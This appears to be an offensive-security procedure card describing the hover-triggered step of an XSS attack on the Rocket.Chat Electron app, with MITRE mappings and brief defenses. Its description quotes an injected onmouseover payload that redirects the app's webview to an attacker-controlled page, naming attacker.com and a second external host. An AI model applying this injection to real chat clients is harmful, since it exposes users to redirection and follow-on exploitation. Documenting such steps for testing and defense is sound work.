---
id: proc-rocket-chat-hover-trigger
tags:
  - xss
  - redirect
  - user-interaction
type: procedure
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Electron
  - macOS
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:23:28.583Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-Redirect-via-Hover

## Summary

This procedure describes the victim interaction step where hovering over the injected link executes the onmouseover JavaScript, redirecting the Electron context to an attacker-controlled page for further exploitation.

## Description

Once the malicious link renders, the injected onmouseover attribute runs location='https://attacker.com/hack.html' upon hover, navigating the app's webview to the attacker's site. This occurs in the renderer process, allowing script execution outside the chat sandbox.

## Requirements

1. Rendered malicious link from previous payload.
2. Victim (or tester) mouse interaction.
3. Attacker page hosted and accessible.

## Defense

Defensive measures and detection strategies:

- Disable or strip event attributes (e.g., onmouseover) in HTML sanitization.
- Use Electron's webSecurity and nodeIntegration=false flags.
- Monitor for unexpected navigations in app logs.

## Objectives

1. Execute injected JS via user gesture.
2. Redirect to external attacker domain.
3. Transition to payload delivery phase.

## Instructions

### Step 1: Position Cursor

**Context**: Locate the rendered link in the chat message.

Move the mouse over the "hax" link text.

> Expected: No visual change, but JS executes silently.

### Step 2: Observe Redirect

**Context**: Confirm the navigation occurs.

The page should load https://maustin.net/hax/rocket/hack.html.

> Expected: Attacker page content displays in the app window.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[xss]]
- [[redirect]]
- [[user-interaction]]
